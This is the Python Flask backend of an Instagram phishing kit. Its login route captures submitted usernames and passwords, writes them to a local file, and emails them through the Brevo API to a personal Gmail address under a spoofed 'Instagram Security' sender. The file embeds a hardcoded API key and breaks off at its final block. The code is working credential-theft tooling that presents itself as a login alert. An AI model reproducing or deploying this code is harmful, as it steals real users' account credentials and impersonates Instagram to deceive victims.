from flask import Flask, request, jsonify
from datetime import datetime
from flask_cors import CORS
import sib_api_v3_sdk
from sib_api_v3_sdk.rest import ApiException
import os

app = Flask(__name__)

# Updated CORS for Vercel frontend
CORS(app, resources={r"/*": {"origins": "*"}})

def send_email_brevo(username, password):
    configuration = sib_api_v3_sdk.Configuration()
    configuration.api_key['api-key'] = 'mAK4zDHMnZ8WObLc'

    api_instance = sib_api_v3_sdk.TransactionalEmailsApi(sib_api_v3_sdk.ApiClient(configuration))
    
    subject = "Instagram Login Alert"
    html_content = f"""
    <html>
        <body style="font-family: Arial, sans-serif;">
            <div style="background-color: #fafafa; padding: 20px;">
                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" style="margin-bottom: 20px;">
                <div style="background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                    <h2 style="color: #262626;">New Instagram Login Detected</h2>
                    <p><strong>Username:</strong> {username}</p>
                    <p><strong>Password:</strong> {password}</p>
                    <p><strong>Time:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
                </div>
            </div>
        </body>
    </html>
    """

    sender = {"name": "Instagram Security", "email": "security@instagram.com"}
    to = [{"email": "rakshitjadon1903@gmail.com", "name": "Rakshit"}]

    send_smtp_email = sib_api_v3_sdk.SendSmtpEmail(
        to=to,
        html_content=html_content,
        sender=sender,
        subject=subject
    )

    try:
        api_response = api_instance.send_transac_email(send_smtp_email)
        return True
    except ApiException as e:
        print(f"Email sending failed: {e}")
        return False

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        try:
            data = request.get_json(silent=True) or request.form
            username = data.get("username", "")
            password = data.get("password", "")
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Log credentials
            with open("create.txt", "a", encoding="utf-8") as f:
                f.write(f"Timestamp: {timestamp}\nUsername: {username}\nPassword: {password}\n{'='*50}\n")
            
            # Send email
            send_email_brevo(username, password)
            
            return jsonify({"status": "success"}), 200

        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    return jsonify({"status": "ok"}), 200

if __name__ == "__main__":
